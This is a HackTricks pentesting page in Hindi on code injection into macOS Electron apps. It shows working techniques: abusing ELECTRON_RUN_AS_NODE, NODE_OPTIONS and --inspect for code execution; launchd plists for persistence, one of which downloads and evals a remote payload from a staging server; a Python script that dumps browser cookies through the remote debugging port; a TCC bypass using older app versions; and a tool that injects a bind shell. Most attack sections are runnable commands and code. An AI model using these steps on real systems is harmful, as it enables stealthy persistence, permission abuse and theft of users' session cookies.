# macOS Electron एप्लिकेशन्स इंजेक्शन

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का पालन करें.**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें.

</details>

## मूल जानकारी

यदि आपको नहीं पता कि Electron क्या है, तो आप [**यहाँ बहुत सारी जानकारी पा सकते हैं**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). लेकिन अभी के लिए बस जान लें कि Electron **node** चलाता है.\
और node में कुछ **पैरामीटर्स** और **env वेरिएबल्स** होते हैं जिनका उपयोग करके **अन्य कोड को निष्पादित करने** के लिए किया जा सकता है, निर्दिष्ट फाइल के अलावा.

### Electron Fuses

ये तकनीकें आगे चर्चा की जाएंगी, लेकिन हाल के समय में Electron ने कई **सुरक्षा झंडे जोड़े हैं उन्हें रोकने के लिए**. ये हैं [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) और ये वे हैं जो macOS में Electron एप्लिकेशन्स को **मनमाने कोड लोड करने से रोकते हैं**:

* **`RunAsNode`**: यदि निष्क्रिय किया गया है, तो यह env var **`ELECTRON_RUN_AS_NODE`** का उपयोग करके कोड इंजेक्ट करने से रोकता है.
* **`EnableNodeCliInspectArguments`**: यदि निष्क्रिय किया गया है, तो पैरामीटर्स जैसे कि `--inspect`, `--inspect-brk` का सम्मान नहीं किया जाएगा. इस तरह से कोड इंजेक्ट करने से बचते हैं.
* **`EnableEmbeddedAsarIntegrityValidation`**: यदि सक्षम किया गया है, तो लोड की गई **`asar`** **फाइल** को macOS द्वारा **मान्य** किया जाएगा. इस तरह से इस फाइल की सामग्री को संशोधित करके **कोड इंजेक्शन** को **रोकता** है.
* **`OnlyLoadAppFromAsar`**: यदि यह सक्षम है, तो इसके बजाय कि निम्नलिखित क्रम में लोड करने की खोज की जाए: **`app.asar`**, **`app`** और अंत में **`default_app.asar`**. यह केवल app.asar की जांच करेगा और उपयोग करेगा, इस प्रकार यह सुनिश्चित करता है कि जब **`embeddedAsarIntegrityValidation`** फ्यूज के साथ **संयुक्त** होता है तो यह **असंभव** है कि **मान्य नहीं किए गए कोड को लोड करें**.
* **`LoadBrowserProcessSpecificV8Snapshot`**: यदि सक्षम है, तो ब्राउज़र प्रक्रिया अपने V8 स्नैपशॉट के लिए `browser_v8_context_snapshot.bin` नामक फाइल का उपयोग करती है.

एक और दिलचस्प फ्यूज जो कोड इंजेक्शन को रोक नहीं रहा है:

* **EnableCookieEncryption**: यदि सक्षम है, तो डिस्क पर कुकी स्टोर OS स्तर की क्रिप्टोग्राफी कुंजियों का उपयोग करके एन्क्रिप्टेड होता है.

### Electron Fuses की जांच करना

आप एक एप्लिकेशन से इन झंडों की **जांच कर सकते हैं** :
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### इलेक्ट्रॉन फ्यूज़ को संशोधित करना

जैसा कि [**डॉक्स में उल्लेख है**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), **इलेक्ट्रॉन फ्यूज़** की कॉन्फ़िगरेशन **इलेक्ट्रॉन बाइनरी** के अंदर कॉन्फ़िगर की जाती है जिसमें कहीं न कहीं स्ट्रिंग **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** होती है।

macOS एप्लिकेशन्स में यह आमतौर पर `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework` में होता है।
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
आप इस फ़ाइल को [https://hexed.it/](https://hexed.it/) में लोड कर सकते हैं और पिछली स्ट्रिंग के लिए खोज कर सकते हैं। इस स्ट्रिंग के बाद आप ASCII में एक नंबर "0" या "1" देख सकते हैं जो दर्शाता है कि प्रत्येक फ्यूज अक्षम या सक्षम है। बस हेक्स कोड को मॉडिफाई करें (`0x30` है `0` और `0x31` है `1`) ताकि **फ्यूज मानों को संशोधित करें**।

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यदि आप इन बाइट्स को संशोधित करके किसी एप्लिकेशन के अंदर **`Electron Framework` बाइनरी** को **ओवरराइट** करने की कोशिश करते हैं, तो ऐप चलेगा नहीं।

## RCE इलेक्ट्रॉन एप्लिकेशन्स में कोड जोड़ना

इलेक्ट्रॉन ऐप जो **बाहरी JS/HTML फ़ाइलें** इस्तेमाल कर रहा हो सकता है, तो एक हमलावर इन फ़ाइलों में कोड इंजेक्ट कर सकता है जिसकी हस्ताक्षर की जांच नहीं की जाएगी और ऐप के संदर्भ में मनमाना कोड निष्पादित कर सकता है।

{% hint style="danger" %}
हालांकि, इस समय 2 सीमाएँ हैं:

* एक ऐप को संशोधित करने के लिए **`kTCCServiceSystemPolicyAppBundles`** अनुमति **आवश्यक** है, इसलिए डिफ़ॉल्ट रूप से यह अब संभव नहीं है।
* संकलित **`asap`** फ़ाइल में आमतौर पर फ्यूज **`embeddedAsarIntegrityValidation`** `और` **`onlyLoadAppFromAsar`** `सक्षम` होते हैं

इस हमले के मार्ग को अधिक जटिल (या असंभव) बनाते हैं।
{% endhint %}

ध्यान दें कि **`kTCCServiceSystemPolicyAppBundles`** की आवश्यकता को बायपास करना संभव है, ऐप्लिकेशन को दूसरी डायरेक्टरी (जैसे **`/tmp`**) में कॉपी करके, फोल्डर **`app.app/Contents`** का नाम बदलकर **`app.app/NotCon`**, **संशोधित** करना आपके **दुर्भावनापूर्ण** कोड के साथ **asar** फ़ाइल, इसे वापस **`app.app/Contents`** के नाम पर बदलना और इसे निष्पादित करना।

आप asar फ़ाइल से कोड अनपैक कर सकते हैं:
```bash
npx asar extract app.asar app-decomp
```
और इसे संशोधित करने के बाद वापस पैक करें:
```bash
npx asar pack app-decomp app-new.asar
```
## `ELECTRON_RUN_AS_NODE` के साथ RCE <a href="#electron_run_as_node" id="electron_run_as_node"></a>

[**डॉक्स के अनुसार**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), यदि यह env वेरिएबल सेट है, तो यह प्रक्रिया को सामान्य Node.js प्रक्रिया के रूप में शुरू करेगा।

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
यदि fuse **`RunAsNode`** निष्क्रिय है तो env var **`ELECTRON_RUN_AS_NODE`** को अनदेखा किया जाएगा, और यह काम नहीं करेगा।
{% endhint %}

### App Plist से Injection

[**यहाँ प्रस्तावित**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/) के अनुसार, आप इस env variable का उपयोग plist में कर सकते हैं ताकि पर्सिस्टेंस बनाए रखा जा सके:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## `NODE_OPTIONS` के साथ RCE

आप पेलोड को एक अलग फाइल में संग्रहित कर सकते हैं और इसे निष्पादित कर सकते हैं:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
यदि fuse **`EnableNodeOptionsEnvironmentVariable`** **निष्क्रिय** है, तो ऐप **NODE\_OPTIONS** env var को **अनदेखा** करेगा जब तक कि env variable **`ELECTRON_RUN_AS_NODE`** सेट नहीं किया जाता, जिसे भी **अनदेखा** किया जाएगा यदि fuse **`RunAsNode`** निष्क्रिय है।

यदि आप **`ELECTRON_RUN_AS_NODE`** सेट नहीं करते हैं, तो आपको **त्रुटि** मिलेगी: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
{% endhint %}

### App Plist से Injection

आप इस env variable का दुरुपयोग plist में इन कुंजियों को जोड़कर पर्सिस्टेंस बनाए रखने के लिए कर सकते हैं:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE के साथ निरीक्षण

[**इस**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) के अनुसार, यदि आप Electron एप्लिकेशन को **`--inspect`**, **`--inspect-brk`** और **`--remote-debugging-port`** जैसे फ्लैग्स के साथ निष्पादित करते हैं, तो एक **डीबग पोर्ट खुल जाएगा** जिससे आप उससे जुड़ सकते हैं (उदाहरण के लिए Chrome में `chrome://inspect` से) और आप उस पर **कोड इंजेक्ट कर सकते हैं** या यहां तक कि नए प्रोसेस भी लॉन्च कर सकते हैं।\
उदाहरण के लिए:

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
यदि fuse**`EnableNodeCliInspectArguments`** अक्षम है, तो ऐप **node पैरामीटर्स को अनदेखा करेगा** (जैसे `--inspect`) जब तक कि env वेरिएबल **`ELECTRON_RUN_AS_NODE`** सेट नहीं होता, जिसे भी **अनदेखा किया जाएगा** यदि fuse **`RunAsNode`** अक्षम है।

हालांकि, आप अभी भी **electron पैरामीटर `--remote-debugging-port=9229`** का उपयोग कर सकते हैं लेकिन पिछला पेलोड अन्य प्रोसेसेस को निष्पादित करने के लिए काम नहीं करेगा।
{% endhint %}

पैरामीटर **`--remote-debugging-port=9222`** का उपयोग करके, आप Electron App से कुछ जानकारी चुरा सकते हैं जैसे कि **history** (GET कमांड्स के साथ) या ब्राउज़र के **cookies** (क्योंकि वे ब्राउज़र के अंदर **decrypted** होते हैं और एक **json endpoint** होता है जो उन्हें देगा)।

आप यह कैसे कर सकते हैं इसके बारे में [**यहाँ**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) और [**यहाँ**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) सीख सकते हैं और स्वचालित उपकरण [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) या एक साधारण स्क्रिप्ट का उपयोग कर सकते हैं जैसे:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
इस [**ब्लॉगपोस्ट**](https://hackerone.com/reports/1274695) में, इस डिबगिंग का दुरुपयोग करके एक हेडलेस क्रोम को **मनमानी फाइलों को मनमाने स्थानों पर डाउनलोड करने** के लिए किया जाता है।

### App Plist से इंजेक्शन

आप इस env वेरिएबल का दुरुपयोग प्लिस्ट में इन कीज़ को जोड़कर पर्सिस्टेंस बनाए रखने के लिए कर सकते हैं:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## पुराने संस्करणों का दुरुपयोग करके TCC बायपास

{% hint style="success" %}
macOS का TCC डेमॉन एप्लिकेशन के निष्पादित संस्करण की जांच नहीं करता है। इसलिए यदि आप **Electron एप्लिकेशन में कोड इंजेक्ट नहीं कर सकते** पिछली तकनीकों के साथ, आप एप्लिकेशन का पिछला संस्करण डाउनलोड कर सकते हैं और उसमें कोड इंजेक्ट कर सकते हैं क्योंकि उसे अभी भी TCC विशेषाधिकार मिलेंगे (जब तक कि Trust Cache इसे रोकता नहीं है)।
{% endhint %}

## गैर JS कोड चलाना

पिछली तकनीकें आपको **Electron एप्लिकेशन की प्रक्रिया के अंदर JS कोड चलाने की अनुमति देंगी**। हालांकि, याद रखें कि **चाइल्ड प्रोसेस माता-पिता एप्लिकेशन के समान सैंडबॉक्स प्रोफाइल के अंतर्गत चलते हैं** और **उनके TCC अनुमतियों को विरासत में प्राप्त करते हैं**।\
इसलिए, यदि आप उदाहरण के लिए कैमरा या माइक्रोफोन तक पहुंचने के लिए अधिकारों का दुरुपयोग करना चाहते हैं, आप सिर्फ **प्रक्रिया से एक अन्य बाइनरी चला सकते हैं**।

## स्वचालित इंजेक्शन

उपकरण [**electroniz3r**](https://github.com/r3ggi/electroniz3r) का उपयोग करके आसानी से **कमजोर Electron एप्लिकेशनों को खोजने** और उनमें कोड इंजेक्ट करने के लिए किया जा सकता है। यह उपकरण **`--inspect`** तकनीक का उपयोग करने का प्रयास करेगा:

आपको इसे स्वयं कंपाइल करना होगा और इसे इस तरह उपयोग कर सकते हैं:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## संदर्भ

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ शून्य से नायक तक AWS हैकिंग सीखें</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>
